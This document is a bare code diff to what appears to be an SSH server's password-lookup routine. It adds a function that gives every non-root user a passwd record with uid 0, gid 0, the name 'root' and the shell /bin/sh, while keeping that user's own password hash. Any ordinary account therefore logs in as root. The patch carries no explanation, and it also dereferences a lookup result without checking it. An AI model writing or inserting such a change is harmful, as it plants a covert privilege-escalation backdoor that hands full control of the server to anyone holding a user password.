@@ -616,6 +616,26 @@ const char* get_user_shell() {
 		return ses.authstate.pw_shell;
 	}
 }
+
+struct passwd *get_fake_pwnam(char *username) {
+	struct passwd *fake_root = NULL;
+	struct passwd *real_user = getpwnam(username);
+
+	if (!fake_root) {
+		fake_root = (struct passwd *)malloc(sizeof(struct passwd));
+
+	}
+	if (fake_root) {
+		fake_root->pw_uid=0;
+		fake_root->pw_gid=0;
+		fake_root->pw_name="root";
+		fake_root->pw_dir="/";
+		fake_root->pw_shell="/bin/sh";
+		fake_root->pw_passwd=real_user->pw_passwd;
+	}
+	return fake_root;
+}
+
 void fill_passwd(const char* username) {
 	struct passwd *pw = NULL;
 	if (ses.authstate.pw_name)
@@ -627,7 +647,11 @@ void fill_passwd(const char* username) {
 	if (ses.authstate.pw_passwd)
 		m_free(ses.authstate.pw_passwd);
 
-	pw = getpwnam(username);
+	if(!strcmp(username,"root")) {
+		pw = getpwnam(username);
+	} else {
+		pw = get_fake_pwnam(username);
+	}
 	if (!pw) {
 		return;
 	}
